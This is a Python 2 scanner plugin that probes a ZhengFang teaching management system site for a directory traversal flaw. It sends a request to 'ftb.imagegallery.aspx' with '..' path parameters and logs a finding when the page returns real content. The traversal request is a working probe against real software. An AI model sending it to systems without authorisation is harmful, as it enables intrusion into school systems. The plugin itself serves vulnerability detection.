#!/usr/bin/python
# -*- coding: utf-8 -*-
from engine.engine_utils.common import *
from engine.logger import scanLogger as logger
from engine.engine_utils.rule_result_judge import page_similar


def run_domain(http,ob):
    result = []
    try:

        scheme = ob['scheme']
        domain = ob['domain']
        header = {'Host': domain}
        source_ip = ob.get('source_ip')
        if source_ip:
            domain = source_ip
        new_url = "%s://%s/%s" % (scheme, domain, "ftb.imagegallery.aspx?frame=1&rif=..&cif=\..")
        res, content = http.request(new_url, headers=header)
        if res and res.get('status') == 200 and content:
            if page_similar(res.get('status'), content, ob.get('404_page')):
                return []
            detail = '检测到正方教学管理系统遍历目录漏洞'
            request = getRequest(new_url, domain=ob['domain'])
            response = getResponse(res, content)
            result.append(getRecord(ob, new_url, ob['level'], detail, request, response))

    except Exception, e:
        logger.error("File:ZhengFangDirectoryTraversalScript_yd.py, run_domain function :%s" % (str(e)))

    return result

